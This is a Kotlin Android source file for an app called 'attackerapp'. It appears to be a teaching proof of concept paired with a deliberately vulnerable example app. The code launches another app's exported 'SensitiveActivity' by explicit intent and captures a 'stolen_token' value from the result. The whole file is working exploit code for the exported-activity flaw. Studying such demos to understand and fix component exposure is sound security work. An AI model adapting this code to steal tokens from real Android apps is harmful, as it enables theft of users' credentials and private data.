package com.example.attackerapp

import android.content.Intent
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.runtime.mutableStateOf
import com.example.attackerapp.ui.theme.AttackerAppTheme

/*
 * Attacker App - Main Activity
 * - tries to launch a sensitive activity in another app to steal data via an exported activity
 */
class MainActivity : ComponentActivity() {

    // Launcher for receiving results from other activities
    private lateinit var launcher: ActivityResultLauncher<Intent>

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Holds the stolen token returned by the victim app
        val stolenTokenMessage = mutableStateOf("No token yet")

        // Register a callback to receive the result from the victim activity
        launcher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == RESULT_OK) {
                val stolenToken = result.data?.getStringExtra("stolen_token")
                stolenTokenMessage.value = stolenToken ?: "No token returned"
            } else {
                stolenTokenMessage.value = "No result received"
            }
        }

        // Compose UI setup
        setContent {
            AttackerAppTheme {
                AttackerAppScreen(
                    stolenTokenMessage = stolenTokenMessage.value,
                    onStealClick = { launchVictimActivity() }
                )
            }
        }
    }

    // Launches the victim app's exported sensitive activity via explicit intent
    private fun launchVictimActivity() {
        val intent = Intent().apply {
            setClassName(
                "com.example.dangerousactivityexample",
                "com.example.dangerousactivityexample.SensitiveActivity"
            )
            action = "com.example.dangerousactivityexample.SHOW_SECRET"
        }
        launcher.launch(intent)
    }
}